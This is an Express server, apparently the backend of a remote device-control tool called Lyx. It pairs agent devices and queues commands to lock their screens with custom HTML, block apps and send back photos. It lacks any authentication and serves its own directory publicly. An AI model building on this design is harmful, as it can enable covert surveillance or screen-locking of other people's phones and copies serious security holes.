const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const app = express();

app.use(cors({ limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

/* Serve static dari beberapa lokasi */
app.use(express.static('public'));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));

/* ==================== DATABASE MEMORY ==================== */
let pairingCodes = {};
let devices = [];
let lastPhoto = null;

/* ==================== PAIRING ==================== */
app.post('/api/generate-pairing', (req, res) => {
  try {
    const code = req.body.code;
    if (!code) return res.json({ success: false, message: 'Code required' });
    pairingCodes[code] = { used: false, createdAt: Date.now() };
    console.log('Pairing code:', code);
    res.json({ success: true, code: code });
  } catch (e) {
    res.json({ success: false, message: e.message });
  }
});

/* ==================== REGISTER DEVICE ==================== */
app.post('/api/register-device', (req, res) => {
  try {
    const code = req.body.code;
    const name = req.body.name || 'Unknown';
    const model = req.body.model || 'Unknown';
    const os = req.body.os || 'Unknown';
    const type = req.body.type || 'android';

    if (!pairingCodes[code]) {
      return res.json({ success: false, message: 'Code invalid' });
    }
    if (pairingCodes[code].used) {
      return res.json({ success: false, message: 'Code used' });
    }

    const device = {
      id: 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
      name: name,
      model: model,
      os: os,
      type: type,
      pairedAt: Date.now(),
      commands: []
    };

    devices.push(device);
    pairingCodes[code].used = true;

    console.log('Device registered:', device.name, device.id);
    res.json({ success: true, deviceId: device.id });
  } catch (e) {
    res.json({ success: false, message: e.message });
  }
});

/* ==================== LIST DEVICES ==================== */
app.get('/api/devices', (req, res) => {
  res.json(devices.map(d => ({
    id: d.id,
    name: d.name,
    model: d.model,
    os: d.os,
    type: d.type
  })));
});

/* ==================== COMMAND UNIVERSAL ==================== */
app.post('/api/command', (req, res) => {
  try {
    const deviceId = req.body.deviceId;
    const type = req.body.type;
    const extra = {};
    for (let k in req.body) {
      if (k !== 'deviceId' && k !== 'type') extra[k] = req.body[k];
    }

    const device = devices.find(d => d.id === deviceId);
    if (!device) return res.json({ success: false, message: 'Device not found' });

    const cmd = { type: type, id: Date.now() };
    for (let k in extra) cmd[k] = extra[k];

    device.commands.push(cmd);
    console.log('Command sent:', type, 'to', device.name);
    res.json({ success: true });
  } catch (e) {
    res.json({ success: false, message: e.message });
  }
});

/* ==================== BACKWARD COMPAT ==================== */
app.post('/api/lock', (req, res) => {
  const deviceId = req.body.deviceId;
  const html = req.body.html;
  const action = req.body.action;
  const device = devices.find(d => d.id === deviceId);
  if (!device) return res.json({ success: false });
  if (action === 'unlock') {
    device.commands.push({ type: 'unlock', id: Date.now() });
  } else {
    device.commands.push({ type: 'lock', html: html || '', id: Date.now() });
  }
  res.json({ success: true });
});

app.post('/api/block-app', (req, res) => {
  const deviceId = req.body.deviceId;
  const appName = req.body.appName;
  const message = req.body.message;
  const device = devices.find(d => d.id === deviceId);
  if (!device) return res.json({ success: false });
  device.commands.push({
    type: 'blockapp',
    appName: appName,
    message: message,
    id: Date.now()
  });
  res.json({ success: true });
});

/* ==================== AGENT POLLING ==================== */
app.get('/api/agent/commands/:deviceId', (req, res) => {
  const device = devices.find(d => d.id === req.params.deviceId);
  if (!device) return res.json({ commands: [] });
  const cmds = device.commands.slice();
  device.commands = [];
  res.json({ commands: cmds });
});

/* ==================== FOTO DARI AGENT ==================== */
app.post('/api/photo', (req, res) => {
  try {
    lastPhoto = req.body.photo;
    console.log('Photo received from', req.body.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.json({ success: false, message: e.message });
  }
});

app.get('/api/photo/latest', (req, res) => {
  res.json({ photo: lastPhoto });
});

/* ==================== ROOT ==================== */
app.get('/', (req, res) => {
  const paths = [
    path.join(__dirname, 'public', 'index.html'),
    path.join(__dirname, 'index.html')
  ];
  for (let p of paths) {
    if (fs.existsSync(p)) return res.sendFile(p);
  }
  res.send('Lyx Server OK - index.html gak ditemukan');
});

app.get('/agent.html', (req, res) => {
  const paths = [
    path.join(__dirname, 'public', 'agent.html'),
    path.join(__dirname, 'agent.html')
  ];
  for (let p of paths) {
    if (fs.existsSync(p)) return res.sendFile(p);
  }
  res.status(404).send('agent.html gak ditemukan');
});

/* ==================== START ==================== */
const PORT = process.env.PORT || 8080;
app.listen(PORT, function() {
  console.log('LYX SERVER RUNNING ON PORT ' + PORT);
});
